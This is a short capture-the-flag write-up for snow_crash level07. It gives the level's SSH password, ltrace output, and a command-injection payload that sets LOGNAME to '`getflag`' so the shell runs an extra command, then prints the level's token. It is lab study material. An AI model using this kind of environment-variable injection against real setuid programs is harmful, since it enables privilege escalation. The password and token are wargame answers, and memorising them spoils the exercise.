@@ -1,0 +1,27 @@
+Level07 - snow_crash
+
+Connect with the previous password "wiok45aaoguiboiki2tuin6ub"
+	ssh -p 4242 level07@192.168.1.20 
+
+We see a file named level07, when launch it just print level07
+
+if we use ltrace, we see this 
+
+	__libc_start_main(0x8048514, 1, 0xbffff7b4, 0x80485b0, 0x8048620 <unfinished ...>
+	getegid()                                                                          = 2007
+	geteuid()                                                                          = 2007
+	setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                = 0
+	setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                = 0
+	getenv("LOGNAME")                                                                  = "level07"
+	asprintf(0xbffff704, 0x8048688, 0xbfffff35, 0xb7e5ee55, 0xb7fed280)                = 18
+	system("/bin/echo level07 "level07
+	 <unfinished ...>
+	--- SIGCHLD (Child exited) ---
+	<... system resumed> )                                                             = 0
+	+++ exited (status 0) +++
+
+it get a env variable, try to put it getflag. 
+	LOGNAME='`getflag`'
+	and launch again we got the flag 
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
